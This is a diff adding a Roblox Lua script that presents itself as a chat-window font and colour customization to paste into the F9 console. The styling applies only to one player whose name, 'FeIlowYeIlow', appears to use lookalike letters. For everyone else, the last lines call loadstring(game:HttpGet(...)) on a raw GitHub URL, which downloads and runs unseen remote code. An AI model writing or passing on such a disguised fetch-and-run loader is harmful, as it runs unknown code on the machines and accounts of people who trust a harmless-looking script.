@@ -1,0 +1,67 @@
+if not game:IsLoaded() then
+    game.Loaded:Wait()
+end
+
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+if player.Name == "FeIlowYeIlow" then
+-- Open the console (press F9) and paste this code to run it immediately
+-- This will modify the existing chat window properties with bold SourceSansPro font
+
+local TextChatService = game:GetService("TextChatService")
+
+-- Find the existing ChatWindowConfiguration or create it if it doesn't exist
+local chatWindowConfig = TextChatService:FindFirstChild("ChatWindowConfiguration")
+
+-- Make the window larger
+--chatWindowConfig.WindowSize = UDim2.new(0.5, 0, 0.5, 0) -- 50% width, 50% height
+
+-- Set appearance properties exactly matching your images
+chatWindowConfig.BackgroundColor3 = Color3.fromRGB(76, 82, 88)
+chatWindowConfig.BackgroundTransparency = 1
+chatWindowConfig.TextColor3 = Color3.fromRGB(255, 255, 255)
+chatWindowConfig.TextSize = 18
+-- Use SourceSansPro with Bold weight from the specified path
+chatWindowConfig.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Bold)
+chatWindowConfig.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+chatWindowConfig.TextStrokeTransparency = 0.5
+
+-- Customize text color for messages
+
+
+-- Customize the input bar
+local inputBarConfig = TextChatService:FindFirstChild("ChatInputBarConfiguration")
+if not inputBarConfig then
+    inputBarConfig = Instance.new("ChatInputBarConfiguration")
+    inputBarConfig.Parent = TextChatService
+end
+inputBarConfig.BackgroundColor3 = Color3.fromRGB(76, 82, 88)
+inputBarConfig.BackgroundTransparency = 1
+inputBarConfig.TextColor3 = Color3.fromRGB(255, 255, 255)
+inputBarConfig.PlaceholderColor3 = Color3.fromRGB(200, 200, 200)
+inputBarConfig.TextSize = 18
+inputBarConfig.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Bold)
+inputBarConfig.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+inputBarConfig.TextStrokeTransparency = 1
+
+-- Customize the channel tabs
+local tabsConfig = TextChatService:FindFirstChild("ChannelTabsConfiguration")
+if not tabsConfig then
+    tabsConfig = Instance.new("ChannelTabsConfiguration")
+    tabsConfig.Parent = TextChatService
+end
+tabsConfig.BackgroundColor3 = Color3.fromRGB(76, 82, 88)
+tabsConfig.BackgroundTransparency = 1
+tabsConfig.TextColor3 = Color3.fromRGB(200, 200, 200)
+--tabsConfig.SelectedBackgroundColor3 = Color3.fromRGB(100, 105, 110)
+--tabsConfig.SelectedTextColor3 = Color3.fromRGB(255, 255, 255)
+tabsConfig.TextSize = 18
+tabsConfig.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Bold)
+tabsConfig.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+tabsConfig.TextStrokeTransparency = 1
+
+print("Chat window customization applied with SourceSansPro Bold!")
+else
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/yaziriscool/sssss/refs/heads/main/Legacy'))()
+end
